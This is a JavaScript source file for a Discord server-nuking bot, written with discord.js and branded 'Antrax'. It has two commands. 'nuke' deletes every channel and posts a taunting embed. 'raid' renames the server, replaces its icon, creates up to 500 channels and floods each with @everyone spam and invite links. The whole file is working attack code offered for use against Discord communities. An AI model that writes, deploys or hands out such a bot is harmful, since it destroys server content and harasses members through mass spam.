// Discord
const Discord = require("discord.js");
const client = new Discord.Client();

// Prefix
const config = require('./config.json');
let prefix = config.prefix;

// Colores CLI-Color
const clc = require('cli-color');
const { redBright } = require("cli-color");
var red = clc.red;
var green = clc.green;

// Consola
client.on('ready', () => {
  console.log(red(`                          
                   .-=                 :-   --.                        :=                  
                   +%%*               .**-=+#%%%%*#%%%%%%%*=.         -%%% :         .      
                 .-%%%*   :--.      :+%%%%%%%%%%#=.. ...-*%%%*:      -#%%%-%*-     =%%%*:   
                -%%%%%:  #%%%:    :*%%%%#++%%%#.   -%%%*  .=%%%-   :%%%%%+-%%%#   *%%%*.    
               =%%%%%%  -%%%%=     :%%:   *%%%.   :%%%#     #%%*  :%%%%%%- .#%%%.#%%%=      
              =%%%+%%%  #%%%%#    .#%:    %%%=   .%%%#   .:+%%%= .%%%+%%%:   #%%%%%%:       
             .%%%..%%# .%%%#%%.  .%%%    =%%#  -##%%#-+#%%%%%%=  #%%- #%%.    *%%%%.        
             #%#::-%%#++%%*.%%-  #%%=    #%%   :%%%%%%###*+=:   +%%-:-#%%+:   +%%%:         
          :-=%%%%%%%%%%%%#  :%# :%%%.    %%:    -%%%%%+      .:-%%%%%%%%%%%= =%%%%*         
      :+##**%*===-:=%+ *%=   =%-#%%#    =%*     #%=:*%%%:.=*%*+%#===---%#.  .%%= *%.        
     :.    #%      .%+ %%     =%%%%*    %%     .%#   :*%%+    =%:      #%  :%%=   ##        
           %:       #* %#      :%%%+    %#     .%+     :*%*   *+       =% -%#:     ++       
          ::        -= #=       +%%=   .%=      %.       -#%-.=         #=%*.       :.      
                     : ::       .-.     %       =          -+#+:.       *#-                 
                                        =                              +.

                                        Author: shmurfy#0417`))

console.log(redBright(` 
          ════════════════════════════════════════════════════════════════════════════════
                                        Tag: ${client.user.tag}
                                        ID: ${client.user.id}
                                        Servers: ${client.guilds.cache.size}
                                        Users: ${client.users.cache.size}
          ════════════════════════════════════════════════════════════════════════════════
`))

presencia();

// Cambiar la presencia cada 10 segundos (ajusta el tiempo según tus necesidades)
setInterval(() => {
  presencia();
}, 10000);
});

function presencia() {
const presences = [
  {
    status: "dnd",
    activity: {
      name: "Made by shmurfy.",
      type: "STREAMING",
      url: "https://www.twitch.tv/agent.btw"
    }
  },
  {
    status: "online",
    activity: {
      name: "Playing with servers.",
      type: "STREAMING",
      url: "https://www.twitch.tv/agent.btw"
    }
  },
  {
    status: "idle",
    activity: {
      name: "I swear I ain't up to no good, mate.",
      type: "STREAMING",
      url: "https://www.twitch.tv/agent.btw"
    }
  },
  // Agrega más objetos de presencia según tus preferencias
];

// Seleccionar una presencia aleatoria de la lista
const randomPresence = presences[Math.floor(Math.random() * presences.length)];

// Establecer la presencia del bot
client.user.setPresence(randomPresence);
}

client.on("message", async (message) => {
  if (message.author.bot) return;

  if (message.content.startsWith(prefix)) {
    const args = message.content.slice(prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    switch (command) {
      case 'nuke':
        if (message.member.hasPermission("ADMINISTRATOR")) {
          // Comando principal
          try {
            message.delete();
            console.log(green(`- Nuke ejecutado`));

            await message.guild.channels.cache.forEach(channel => channel.delete());

            const channel = await message.guild.channels.create(`nuked`, {
              type: 'text'
            });

            const nukeEmbed = new Discord.MessageEmbed()
              .setColor('BLACK')
              .setTitle(`#KASecurity - Nuked`)
              .setDescription('Your server has been nuked by Antrax...')
              .setFooter('#KillAnything')
              .setImage('https://cdn.discordapp.com/attachments/1030289829667282986/1037114393143549962/unknown.png')
              .setTimestamp();

            await channel.send(nukeEmbed);
          } catch (error) {
            console.error(red(`- Error al ejecutar el comando nuke: ${error}`));
          }
        } else {
          message.reply("No tienes permisos para ejecutar este comando.");
        }
        break;

      case 'raid':
        if (message.member.hasPermission("ADMINISTRATOR")) {
          // Comando principal
          try {
            message.delete();
            console.log(green(`- ${message.author.tag} Has executed the raid command`));
    
            const maxChannels = 500;
            const maxMessages = 15;
    
            // Cambiar nombre y icono del servidor
            await message.guild.setName("Antrax Squad - Attack");
            await message.guild.setIcon("https://media.discordapp.net/attachments/973332506965323857/980157838934569030/unknown.png?");
    
            // Crear canales y enviar mensajes en paralelo
            const createAndSendMessagePromises = [];
            for (let i = 0; i < maxChannels; i++) {
              createAndSendMessagePromises.push(
                (async () => {
                  const channel = await message.guild.channels.create(`server-attacked`, {
                    type: 'text'
                  });
    
                  for (let j = 0; j < maxMessages; j++) {
                    await channel.send("***AttackedByAntrax*** - https://discord.gg/NQUHEbcNRG - https://discord.gg/bXQPuHWSS9 @everyone");
                  }
                })()
              );
            }
    
            // Esperar a que se completen todas las tareas asincrónicas
            await Promise.all(createAndSendMessagePromises);
    
            console.log(green(`- All channels and messages created successfully.`));
          } catch (error) {
            console.error(red(`- Error al ejecutar el comando raid: ${error}`));
          }
        } else {
          message.reply("No tienes permisos para ejecutar este comando.");
        }
        break;
    }
  }
});

client.login(config.token);
